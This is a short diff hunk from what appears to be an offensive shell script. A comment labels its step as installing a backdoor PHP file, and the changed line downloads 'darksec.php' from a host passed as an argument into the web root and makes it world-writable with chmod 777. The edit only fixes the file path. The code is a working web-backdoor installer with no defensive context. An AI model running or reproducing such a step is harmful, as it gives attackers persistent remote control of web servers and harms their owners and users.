@@ -36,7 +36,7 @@ sleep 1
 
 # CHANGE DIRETORY WEB INSTALL BACKDOOR.PHP
 
-cd /var/www/html/ && wget -q http://$1//darksec.php &&  curl -s http://$1//darksec.php -o darksec.php && chmod 777 $3/darksec.php
+cd /var/www/html/ && wget -q http://$1//darksec.php &&  curl -s http://$1//darksec.php -o darksec.php && chmod 777 /var/www/html/darksec.php
 
 #BACK DIretory
 cd $darksec
